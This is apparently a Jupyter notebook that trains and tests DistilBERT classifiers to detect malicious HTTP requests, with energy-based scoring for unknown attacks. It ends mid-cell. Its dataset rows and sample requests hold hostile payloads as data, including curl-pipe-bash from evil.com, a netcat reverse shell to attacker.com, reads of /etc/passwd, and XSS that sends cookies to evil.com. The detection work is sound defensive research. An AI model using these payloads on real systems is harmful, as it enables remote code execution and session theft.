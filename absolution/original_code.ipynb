{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 18,
   "id": "09484a04",
   "metadata": {},
   "outputs": [],
   "source": [
    "import torch\n",
    "import numpy as np\n",
    "import pandas as pd\n",
    "from tqdm import tqdm\n",
    "from pprint import pprint\n",
    "from datasets import Dataset, ClassLabel\n",
    "from transformers import AutoTokenizer, AutoModelForSequenceClassification"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "id": "06f760f2",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>is_attack</th>\n",
       "      <th>label</th>\n",
       "      <th>method</th>\n",
       "      <th>url</th>\n",
       "      <th>host</th>\n",
       "      <th>user_agent</th>\n",
       "      <th>accept</th>\n",
       "      <th>accept_language</th>\n",
       "      <th>accept_encoding</th>\n",
       "      <th>content_type</th>\n",
       "      <th>content_length</th>\n",
       "      <th>connection</th>\n",
       "      <th>cookie</th>\n",
       "      <th>body</th>\n",
       "      <th>x_forwarded_for</th>\n",
       "      <th>referer</th>\n",
       "      <th>origin</th>\n",
       "      <th>x_requested_with</th>\n",
       "      <th>http_version</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>1</td>\n",
       "      <td>path_traversal</td>\n",
       "      <td>PUT</td>\n",
       "      <td>/contact?path=..%5c..%5c..%5csystem32%5cconfig...</td>\n",
       "      <td>linkedinbackup.co</td>\n",
       "      <td>Mozilla/5.0 (compatible; AhrefsBot/7.0; +http:...</td>\n",
       "      <td>text/html,application/xhtml+xml,application/xm...</td>\n",
       "      <td>tr;q=0.9</td>\n",
       "      <td>gzip, deflate, br</td>\n",
       "      <td>application/json</td>\n",
       "      <td>\"\"</td>\n",
       "      <td>keep-alive</td>\n",
       "      <td>ASP.NET_SessionId=; ls -la; trackingId=; curl ...</td>\n",
       "      <td>{\"values\": [\"?path=..%5c..%5c..%5csystem32%5cc...</td>\n",
       "      <td>\"\"</td>\n",
       "      <td>\"\"</td>\n",
       "      <td>\"\"</td>\n",
       "      <td>\"\"</td>\n",
       "      <td>HTTP/1.1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>0</td>\n",
       "      <td>benign</td>\n",
       "      <td>GET</td>\n",
       "      <td>/backup</td>\n",
       "      <td>www.mahindra.com</td>\n",
       "      <td>Mozilla/5.0 (Windows NT 10.0; Win64; x64) Appl...</td>\n",
       "      <td>text/html,application/xhtml+xml,application/xm...</td>\n",
       "      <td>pt;q=0.9</td>\n",
       "      <td>gzip, deflate, br</td>\n",
       "      <td>\"\"</td>\n",
       "      <td>\"\"</td>\n",
       "      <td>keep-alive</td>\n",
       "      <td>PHPSESSID=random_session_id; lang=es</td>\n",
       "      <td>\"\"</td>\n",
       "      <td>\"\"</td>\n",
       "      <td>\"\"</td>\n",
       "      <td>\"\"</td>\n",
       "      <td>\"\"</td>\n",
       "      <td>HTTP/1.1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>0</td>\n",
       "      <td>benign</td>\n",
       "      <td>DELETE</td>\n",
       "      <td>/search</td>\n",
       "      <td>www.chase.com</td>\n",
       "      <td>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:1...</td>\n",
       "      <td>text/html,application/xhtml+xml,application/xm...</td>\n",
       "      <td>fr;q=0.9</td>\n",
       "      <td>gzip, deflate, br</td>\n",
       "      <td>\"\"</td>\n",
       "      <td>\"\"</td>\n",
       "      <td>keep-alive</td>\n",
       "      <td>ASP.NET_SessionId=random_session_id; _ga=GA_an...</td>\n",
       "      <td>\"\"</td>\n",
       "      <td>\"\"</td>\n",
       "      <td>https://www.chase.com/products</td>\n",
       "      <td>\"\"</td>\n",
       "      <td>\"\"</td>\n",
       "      <td>HTTP/1.1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>1</td>\n",
       "      <td>ssrf</td>\n",
       "      <td>DELETE</td>\n",
       "      <td>/api/cart?proxy=http://127.0.0.1%2523@public.com</td>\n",
       "      <td>memberbank.org</td>\n",
       "      <td>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7...</td>\n",
       "      <td>text/html,application/xhtml+xml,application/xm...</td>\n",
       "      <td>no;q=0.9</td>\n",
       "      <td>gzip, deflate, br</td>\n",
       "      <td>\"\"</td>\n",
       "      <td>\"\"</td>\n",
       "      <td>keep-alive</td>\n",
       "      <td>sessionid=&amp; whoami; trackingId=|cat /etc/passw...</td>\n",
       "      <td>\"\"</td>\n",
       "      <td>\"\"</td>\n",
       "      <td>\"\"</td>\n",
       "      <td>\"\"</td>\n",
       "      <td>\"\"</td>\n",
       "      <td>HTTP/1.1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>0</td>\n",
       "      <td>benign</td>\n",
       "      <td>POST</td>\n",
       "      <td>/.env</td>\n",
       "      <td>www.blinkit.com</td>\n",
       "      <td>masscan/1.0 (https://github.com/robertdavidgra...</td>\n",
       "      <td>text/html,application/xhtml+xml,application/xm...</td>\n",
       "      <td>fi;q=0.9</td>\n",
       "      <td>gzip, deflate, br</td>\n",
       "      <td>application/x-www-form-urlencoded</td>\n",
       "      <td>\"\"</td>\n",
       "      <td>keep-alive</td>\n",
       "      <td>express:sess=random_session_id; _ga=GA_analyti...</td>\n",
       "      <td>Generic content type 7590</td>\n",
       "      <td>\"\"</td>\n",
       "      <td>\"\"</td>\n",
       "      <td>\"\"</td>\n",
       "      <td>\"\"</td>\n",
       "      <td>HTTP/1.1</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "  is_attack           label  method  ... origin x_requested_with http_version\n",
       "0         1  path_traversal     PUT  ...     \"\"               \"\"     HTTP/1.1\n",
       "1         0          benign     GET  ...     \"\"               \"\"     HTTP/1.1\n",
       "2         0          benign  DELETE  ...     \"\"               \"\"     HTTP/1.1\n",
       "3         1            ssrf  DELETE  ...     \"\"               \"\"     HTTP/1.1\n",
       "4         0          benign    POST  ...     \"\"               \"\"     HTTP/1.1\n",
       "\n",
       "[5 rows x 19 columns]"
      ]
     },
     "execution_count": 19,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Load dataset\n",
    "df = pd.read_csv(\"./Datasets/multi_samples_55k.csv\", dtype=str)\n",
    "# df = pd.read_csv(\"./Datasets/binary_samples_50k.csv\", dtype=str)\n",
    "df = df.fillna('\"\"')\n",
    "df.head()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "id": "1dc367c8",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "('[METHOD] PUT [URL] /contact?path=..%5c..%5c..%5csystem32%5cconfig%5csystem '\n",
      " '[COOKIE] ASP.NET_SessionId=; ls -la; trackingId=; curl '\n",
      " 'http://evil.com/script.sh | bash; lang=| nc -e /bin/bash attacker.com 4444 '\n",
      " '[BODY] {\"values\": [\"?path=..%5c..%5c..%5csystem32%5cconfig%5csystem\", '\n",
      " '\"test\", \"sample\"]} [HOST] linkedinbackup.co [USER_AGENT] Mozilla/5.0 '\n",
      " '(compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/) [X_FORWARDED_FOR] \"\" '\n",
      " '[REFERER] \"\" [X_REQUESTED_WITH] \"\" [ACCEPT_LANG] tr;q=0.9 [HTTP_VERSION] '\n",
      " 'HTTP/1.1')\n"
     ]
    }
   ],
   "source": [
    "# Combine features into a single text field\n",
    "df[\"value\"] = df.apply(\n",
    "    lambda row: f\"\"\"[METHOD] {row['method']} [URL] {row['url']} [COOKIE] {row['cookie']} [BODY] {row['body']} [HOST] {row['host']} [USER_AGENT] {row['user_agent']} [X_FORWARDED_FOR] {row['x_forwarded_for']} [REFERER] {row['referer']} [X_REQUESTED_WITH] {row['x_requested_with']} [ACCEPT_LANG] {row['accept_language']} [HTTP_VERSION] {row['http_version']}\"\"\",\n",
    "    axis=1\n",
    ")\n",
    "pprint(df[\"value\"][0])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "id": "153d1f18",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "Dataset({\n",
       "    features: ['value', 'label'],\n",
       "    num_rows: 55000\n",
       "})"
      ]
     },
     "execution_count": 21,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "dataset = Dataset.from_pandas(df[[\"value\", \"label\"]])\n",
    "dataset"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 22,
   "id": "d911d18f",
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "Casting the dataset: 100%|██████████| 55000/55000 [00:00<00:00, 561272.00 examples/s]\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "{'value': Value(dtype='string', id=None),\n",
       " 'label': ClassLabel(names=['benign', 'deserialization', 'graphql_attacks', 'jwt_attacks', 'lfi', 'modern_cmdi', 'modern_file_attacks', 'modern_sqli', 'modern_ssrf', 'modern_xss', 'nosql_injection', 'open_redirect', 'path_traversal', 'prototype_pollution', 'sqli', 'ssrf', 'template_injection', 'xss', 'xxe_injection'], id=None)}"
      ]
     },
     "execution_count": 22,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "unique_labels = sorted(df['label'].unique()) # need to add one more Suspicious Activity Detected\n",
    "label_count = df['label'].value_counts()\n",
    "dataset = dataset.cast_column(\"label\", ClassLabel(names=unique_labels, num_classes=len(label_count)))\n",
    "dataset.features"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 23,
   "id": "3aeedac0",
   "metadata": {},
   "outputs": [],
   "source": [
    "train_test = dataset.train_test_split(test_size=0.3, stratify_by_column=\"label\", seed=42)\n",
    "val_test = train_test[\"test\"].train_test_split(test_size=0.5, stratify_by_column=\"label\", seed=42)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 24,
   "id": "313db346",
   "metadata": {},
   "outputs": [],
   "source": [
    "dataset_dict = {\n",
    "    \"train\": train_test[\"train\"],\n",
    "    \"val\": val_test[\"train\"],\n",
    "    \"test\": val_test[\"test\"]\n",
    "}"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "c278bb83",
   "metadata": {},
   "source": [
    "Now load my trained binary model, show as follows:\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 25,
   "id": "f4295a0c",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "DistilBertForSequenceClassification(\n",
       "  (distilbert): DistilBertModel(\n",
       "    (embeddings): Embeddings(\n",
       "      (word_embeddings): Embedding(30522, 768, padding_idx=0)\n",
       "      (position_embeddings): Embedding(512, 768)\n",
       "      (LayerNorm): LayerNorm((768,), eps=1e-12, elementwise_affine=True)\n",
       "      (dropout): Dropout(p=0.1, inplace=False)\n",
       "    )\n",
       "    (transformer): Transformer(\n",
       "      (layer): ModuleList(\n",
       "        (0-5): 6 x TransformerBlock(\n",
       "          (attention): DistilBertSdpaAttention(\n",
       "            (dropout): Dropout(p=0.1, inplace=False)\n",
       "            (q_lin): Linear(in_features=768, out_features=768, bias=True)\n",
       "            (k_lin): Linear(in_features=768, out_features=768, bias=True)\n",
       "            (v_lin): Linear(in_features=768, out_features=768, bias=True)\n",
       "            (out_lin): Linear(in_features=768, out_features=768, bias=True)\n",
       "          )\n",
       "          (sa_layer_norm): LayerNorm((768,), eps=1e-12, elementwise_affine=True)\n",
       "          (ffn): FFN(\n",
       "            (dropout): Dropout(p=0.1, inplace=False)\n",
       "            (lin1): Linear(in_features=768, out_features=3072, bias=True)\n",
       "            (lin2): Linear(in_features=3072, out_features=768, bias=True)\n",
       "            (activation): GELUActivation()\n",
       "          )\n",
       "          (output_layer_norm): LayerNorm((768,), eps=1e-12, elementwise_affine=True)\n",
       "        )\n",
       "      )\n",
       "    )\n",
       "  )\n",
       "  (pre_classifier): Linear(in_features=768, out_features=768, bias=True)\n",
       "  (classifier): Linear(in_features=768, out_features=2, bias=True)\n",
       "  (dropout): Dropout(p=0.2, inplace=False)\n",
       ")"
      ]
     },
     "execution_count": 25,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "binary_model_dir = \"./Models/absolution\"\n",
    "binary_model = AutoModelForSequenceClassification.from_pretrained(\n",
    "    binary_model_dir,\n",
    "    use_safetensors=True  # Explicitly load from .safetensors (optional, auto-detected)\n",
    ")\n",
    "binary_model_tokenizer = AutoTokenizer.from_pretrained(binary_model_dir)\n",
    "\n",
    "device = torch.device(\"cuda\" if torch.cuda.is_available() else \"cpu\")\n",
    "binary_model = binary_model.to(device)\n",
    "binary_model.eval() # Set to evaluation mode"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 26,
   "id": "404ef807",
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "Map:   0%|          | 0/38500 [00:00<?, ? examples/s]"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "Map: 100%|██████████| 38500/38500 [00:12<00:00, 3182.49 examples/s]\n",
      "Map: 100%|██████████| 8250/8250 [00:02<00:00, 3365.55 examples/s]\n",
      "Map: 100%|██████████| 8250/8250 [00:02<00:00, 3174.77 examples/s]\n"
     ]
    }
   ],
   "source": [
    "def tokenize_fun(examples):\n",
    "    return binary_model_tokenizer(\n",
    "        examples[\"value\"],\n",
    "        padding=\"max_length\",\n",
    "        truncation=True,\n",
    "        max_length=512,\n",
    "        return_tensors=\"pt\"\n",
    "    )\n",
    "\n",
    "tokenized_datasets = {\n",
    "    \"train\": dataset_dict[\"train\"].map(tokenize_fun, batched=True),\n",
    "    \"val\": dataset_dict[\"val\"].map(tokenize_fun, batched=True),\n",
    "    \"test\": dataset_dict[\"test\"].map(tokenize_fun, batched=True)\n",
    "}"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 27,
   "id": "0a47f146",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "{'value': Value(dtype='string', id=None),\n",
       " 'label': ClassLabel(names=['benign', 'deserialization', 'graphql_attacks', 'jwt_attacks', 'lfi', 'modern_cmdi', 'modern_file_attacks', 'modern_sqli', 'modern_ssrf', 'modern_xss', 'nosql_injection', 'open_redirect', 'path_traversal', 'prototype_pollution', 'sqli', 'ssrf', 'template_injection', 'xss', 'xxe_injection'], id=None),\n",
       " 'input_ids': Sequence(feature=Value(dtype='int32', id=None), length=-1, id=None),\n",
       " 'attention_mask': Sequence(feature=Value(dtype='int8', id=None), length=-1, id=None)}"
      ]
     },
     "execution_count": 27,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "tokenized_datasets['val'].features"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "7c58fdeb",
   "metadata": {},
   "source": [
    "INIT MULTI MODEL\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 28,
   "id": "151fa47c",
   "metadata": {},
   "outputs": [],
   "source": [
    "train_labels = dataset_dict[\"train\"][\"label\"]\n",
    "class_counts = np.bincount(train_labels)\n",
    "class_weights = torch.tensor([1.0 / count for count in class_counts], dtype=torch.float32)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 29,
   "id": "7a2b5d5a",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "DistilBertForSequenceClassification(\n",
       "  (distilbert): DistilBertModel(\n",
       "    (embeddings): Embeddings(\n",
       "      (word_embeddings): Embedding(30522, 768, padding_idx=0)\n",
       "      (position_embeddings): Embedding(512, 768)\n",
       "      (LayerNorm): LayerNorm((768,), eps=1e-12, elementwise_affine=True)\n",
       "      (dropout): Dropout(p=0.1, inplace=False)\n",
       "    )\n",
       "    (transformer): Transformer(\n",
       "      (layer): ModuleList(\n",
       "        (0-5): 6 x TransformerBlock(\n",
       "          (attention): DistilBertSdpaAttention(\n",
       "            (dropout): Dropout(p=0.1, inplace=False)\n",
       "            (q_lin): Linear(in_features=768, out_features=768, bias=True)\n",
       "            (k_lin): Linear(in_features=768, out_features=768, bias=True)\n",
       "            (v_lin): Linear(in_features=768, out_features=768, bias=True)\n",
       "            (out_lin): Linear(in_features=768, out_features=768, bias=True)\n",
       "          )\n",
       "          (sa_layer_norm): LayerNorm((768,), eps=1e-12, elementwise_affine=True)\n",
       "          (ffn): FFN(\n",
       "            (dropout): Dropout(p=0.1, inplace=False)\n",
       "            (lin1): Linear(in_features=768, out_features=3072, bias=True)\n",
       "            (lin2): Linear(in_features=3072, out_features=768, bias=True)\n",
       "            (activation): GELUActivation()\n",
       "          )\n",
       "          (output_layer_norm): LayerNorm((768,), eps=1e-12, elementwise_affine=True)\n",
       "        )\n",
       "      )\n",
       "    )\n",
       "  )\n",
       "  (pre_classifier): Linear(in_features=768, out_features=768, bias=True)\n",
       "  (classifier): Linear(in_features=768, out_features=19, bias=True)\n",
       "  (dropout): Dropout(p=0.2, inplace=False)\n",
       ")"
      ]
     },
     "execution_count": 29,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Load the trained multi-class model and move to device\n",
    "model_multi = AutoModelForSequenceClassification.from_pretrained(\"./Models/multibsolution\").to(device)\n",
    "model_multi.eval()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 30,
   "id": "9a0a1139",
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "100%|██████████| 8250/8250 [03:40<00:00, 37.49it/s]\n"
     ]
    }
   ],
   "source": [
    "def energy_score(logits, T=1):\n",
    "    return -T * torch.logsumexp(logits / T, dim=1)\n",
    "\n",
    "# Compute energy scores\n",
    "val_energies = []\n",
    "val_labels = []\n",
    "\n",
    "with torch.no_grad():\n",
    "    for example in tqdm(tokenized_datasets[\"val\"]):\n",
    "        inputs = {\n",
    "            \"input_ids\": torch.tensor([example[\"input_ids\"]]).to(device),\n",
    "            \"attention_mask\": torch.tensor([example[\"attention_mask\"]]).to(device)\n",
    "        }\n",
    "        outputs = model_multi(**inputs)\n",
    "        energy = energy_score(outputs.logits).item()\n",
    "        val_energies.append(energy)\n",
    "        val_labels.append(example[\"label\"])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 31,
   "id": "c8267e4e",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Optimal energy threshold: -10.053601026535034\n"
     ]
    }
   ],
   "source": [
    "threshold = np.percentile(val_energies, 95)  # 95% of known attacks have energy < this value\n",
    "print(f\"Optimal energy threshold: {threshold}\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 32,
   "id": "550f6864",
   "metadata": {},
   "outputs": [],
   "source": [
    "def detect_attack(text, binary_model, multi_model, tokenizer, energy_threshold=-5, device=\"cuda\"):\n",
    "    # Move models to device\n",
    "    binary_model = binary_model.to(device)\n",
    "    multi_model = multi_model.to(device)\n",
    "    \n",
    "    # Tokenize input\n",
    "    inputs = tokenizer(text, return_tensors=\"pt\", truncation=True, max_length=512).to(device)\n",
    "    \n",
    "    # Get predictions from both models\n",
    "    with torch.no_grad():\n",
    "        binary_out = binary_model(**inputs)\n",
    "        multi_out = multi_model(**inputs)\n",
    "    \n",
    "    # Process binary model output\n",
    "    binary_probs = torch.softmax(binary_out.logits, dim=-1)\n",
    "    binary_pred = torch.argmax(binary_probs).item()  # 0=benign, 1=malicious\n",
    "    \n",
    "    # Process multi-class model output\n",
    "    multi_probs = torch.softmax(multi_out.logits, dim=-1)\n",
    "    multi_pred_idx = torch.argmax(multi_probs).item()\n",
    "    multi_pred_label = multi_model.config.id2label[multi_pred_idx]\n",
    "    \n",
    "    # Calculate energy score\n",
    "    energy = energy_score(multi_out.logits).item()\n",
    "    \n",
    "    # Decision logic\n",
    "    final_label = \"benign\"\n",
    "    confidence = 1.0\n",
    "    \n",
    "    # Case 1: Both models agree on malicious (1 & 1)\n",
    "    if binary_pred == 1 and multi_pred_label != \"benign\":\n",
    "        final_label = multi_pred_label if energy <= energy_threshold else \"unknown_malware\"\n",
    "        confidence = multi_probs[0][multi_pred_idx].item()\n",
    "    \n",
    "    # Case 2: Binary says malicious, multi says benign (1 & 0)\n",
    "    elif binary_pred == 1 and multi_pred_label == \"benign\":\n",
    "        final_label = \"unknown_malware\" if energy > energy_threshold else \"benign\"\n",
    "        confidence = binary_probs[0][1].item()  # Binary's malicious confidence\n",
    "    \n",
    "    # Case 3: Binary says benign, multi says malicious (0 & 1)\n",
    "    elif binary_pred == 0 and multi_pred_label != \"benign\":\n",
    "        final_label = multi_pred_label  # Trust multi-class prediction\n",
    "        confidence = multi_probs[0][multi_pred_idx].item()\n",
    "    \n",
    "    # Case 4: Both say benign but check OOD (0 & 0)\n",
    "    else:\n",
    "        if energy > energy_threshold:\n",
    "            final_label = \"unknown_malware\"\n",
    "            confidence = energy  # Use energy as confidence measure\n",
    "        else:\n",
    "            final_label = \"benign\"\n",
    "            confidence = binary_probs[0][0].item() * multi_probs[0][0].item()  # Combined confidence\n",
    "    \n",
    "    return {\n",
    "        \"final_label\": final_label,\n",
    "        \"confidence\": confidence,\n",
    "        \"binary_score\": binary_probs.cpu().detach().numpy()[0],\n",
    "        \"multi_scores\": multi_probs.cpu().detach().numpy()[0],\n",
    "        \"energy_score\": energy\n",
    "    }"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 33,
   "id": "5010d9a9",
   "metadata": {},
   "outputs": [],
   "source": [
    "# sample_request = \"[METHOD] GET [URL] /ping?ip=127.0.0.1;cat+/etc/passwd [COOKIE] PHPSESSID=nqc199c0v4bsri69skm0216m9d; _ga=GA1.2.1863267974.1695287985 [BODY]  [HOST] storageoffer.edu [PROTOCOL] HTTP/1.1 [USER_AGENT] Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Safari/537.36 [ACCEPT] text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 [ACCEPT_ENCODING] gzip, deflate, br [ACCEPT_LANGUAGE] en-IN,en;q=0.5 [CONTENT_TYPE]  [CONTENT_LENGTH]  [CONNECTION] keep-alive [X_FORWARDED_FOR] 183.49.114.224 [REFERER]\"\n",
    "# sample_request = \"[METHOD] GET [URL] /ping?ip=127.0.0.1%3Bcat%20%2Fetc%2Fpasswd [COOKIE] PHPSESSID=nqc199c0v4bsri69skm0216m9d; _ga=GA1.2.1863267974.1695287985 [BODY]  [HOST] storageoffer.edu [PROTOCOL] HTTP/1.1 [USER_AGENT] Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Safari/537.36 [ACCEPT] text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 [ACCEPT_ENCODING] gzip, deflate, br [ACCEPT_LANGUAGE] en-IN,en;q=0.5 [CONTENT_TYPE]  [CONTENT_LENGTH]  [CONNECTION] keep-alive [X_FORWARDED_FOR] 183.49.114.224 [REFERER]\"\n",
    "# sample_request = \"[METHOD] PATCH [URL] /dashboard [COOKIE] PHPSESSID=j9h8odcf4ggeixsmpu16zl6mz2; tracking_id=UA441811 [BODY]  [HOST] userblog.info [PROTOCOL] HTTP/1.1 [USER_AGENT] Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 [ACCEPT] text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 [ACCEPT_ENCODING] gzip, deflate, br [ACCEPT_LANGUAGE] en-US,en;q=0.5 [CONTENT_TYPE]  [CONTENT_LENGTH]  [CONNECTION] keep-alive [X_FORWARDED_FOR] 148.30.115.218 [REFERER] https://legitimate-site.com/\"\n",
    "sample_request = \"[METHOD] POST [URL] /dashboard [COOKIE] PHPSESSID=zkvw6vx5yl005qsa0767qucbi9; tracking_id=UA970776; _ga=GA1.2.1275907055.1612569275; auth_bypass=true [BODY]  [HOST] spotifymember.me [PROTOCOL] HTTP/1.1 [USER_AGENT] Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1 [ACCEPT] text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 [ACCEPT_ENCODING] gzip, deflate, br [ACCEPT_LANGUAGE] en-US,en;q=0.5 [CONTENT_TYPE] application/x-yaml [CONTENT_LENGTH] 0 [CONNECTION] keep-alive [X_FORWARDED_FOR] 154.181.93.29 [REFERER] https://google.com/\"\n",
    "# sample_request = \"[METHOD] GET [URL] /dashboard [COOKIE] PHPSESSID=kq51iwb3yadkkuveoq9wb107d6; tracking_id=UA981031 [BODY]  [HOST] netflixinvest.edu [PROTOCOL] HTTP/1.1 [USER_AGENT] Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36 [ACCEPT] text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 [ACCEPT_ENCODING] gzip, deflate, br [ACCEPT_LANGUAGE] en-US,en;q=0.5 [CONTENT_TYPE]  [CONTENT_LENGTH]  [CONNECTION] close [X_FORWARDED_FOR]  [REFERER]\"\n",
    "sample_request = \"[METHOD] PUT [URL] /shell.php?search=<style>@keyframes [COOKIE] _rails_session=<script>WebSocket('ws://evil.com').send(document.cookie)</script>; _ga=<script>new Image().src='http://evil.com/?c='+document.cookie;</script> [BODY] data=?search=<style>@keyframes x{}</style><iframe style='animation-name:x' onanimationend='alert(1)'>&timestamp=1746479555 [HOST] appletwitter.biz [PROTOCOL]  [USER_AGENT] Mozilla/5.0 (Linux; Android 14; OnePlus 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36 [ACCEPT] text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 [ACCEPT_ENCODING] gzip, deflate, br [ACCEPT_LANGUAGE] es;q=0.9 [CONTENT_TYPE] multipart/form-data [CONTENT_LENGTH]  [CONNECTION] close [X_FORWARDED_FOR]  [REFERER] \"\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 34,
   "id": "a6b64d96",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "Final Classification: xss\n",
      "Confidence: 100.00%\n",
      "Energy Score: -11.70\n",
      "Binary Probabilities: [Benign: 0.0000, Malicious: 1.0000]\n",
      "Multi-Class Probabilities:\n",
      "  benign: 0.0000\n",
      "  deserialization: 0.0000\n",
      "  graphql_attacks: 0.0000\n",
      "  jwt_attacks: 0.0000\n",
      "  lfi: 0.0000\n",
      "  modern_cmdi: 0.0000\n",
      "  modern_file_attacks: 0.0000\n",
      "  modern_sqli: 0.0000\n",
      "  modern_ssrf: 0.0000\n",
      "  modern_xss: 0.0000\n",
      "  nosql_injection: 0.0000\n",
      "  open_redirect: 0.0000\n",
      "  path_traversal: 0.0000\n",
      "  prototype_pollution: 0.0000\n",
      "  sqli: 0.0000\n",
      "  ssrf: 0.0000\n",
      "  template_injection: 0.0000\n",
      "  xss: 1.0000\n",
      "  xxe_injection: 0.0000\n",
      "\n",
      "OOD Threshold: -4 (Values above this indicate potential unknown attacks)\n"
     ]
    }
   ],
   "source": [
    "energy_threshold = -4\n",
    "\n",
    "result = detect_attack(\n",
    "    text=sample_request,\n",
    "    binary_model=binary_model,\n",
    "    multi_model=model_multi,\n",
    "    tokenizer=binary_model_tokenizer,\n",
    "    energy_threshold=energy_threshold,  # Tuned threshold from validation\n",
    "    device=\"cuda\" if torch.cuda.is_available() else \"cpu\"\n",
    ")\n",
    "\n",
    "# Formatted output with proper dictionary access\n",
    "print(f\"\"\"\n",
    "Final Classification: {result['final_label']}\n",
    "Confidence: {result['confidence']:.2%}\n",
    "Energy Score: {result['energy_score']:.2f}\n",
    "Binary Probabilities: [Benign: {result['binary_score'][0]:.4f}, Malicious: {result['binary_score'][1]:.4f}]\n",
    "Multi-Class Probabilities:\"\"\")\n",
    "\n",
    "# Print multi-class probabilities with labels\n",
    "for label, prob in zip(model_multi.config.id2label.values(), result['multi_scores']):\n",
    "    print(f\"  {label}: {prob:.4f}\")\n",
    "\n",
    "# Add OOD threshold reference\n",
    "print(f\"\\nOOD Threshold: {energy_threshold} (Values above this indicate potential unknown attacks)\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 35,
   "id": "376efbe7",
   "metadata": {},
   "outputs": [],
   "source": [
    "# def detect_attack(text, binary_model, multi_model, tokenizer, energy_threshold=-5):\n",
    "#     # Step 1: Binary classification\n",
    "#     binary_inputs = tokenizer(text, return_tensors=\"pt\", truncation=True, max_length=512).to(device)\n",
    "#     binary_outputs = binary_model(**binary_inputs)\n",
    "#     binary_probs = torch.nn.functional.softmax(binary_outputs.logits, dim=-1)\n",
    "    \n",
    "#     if torch.argmax(binary_probs).item() == 0:  # Benign\n",
    "#         return \"benign\", binary_probs\n",
    "    \n",
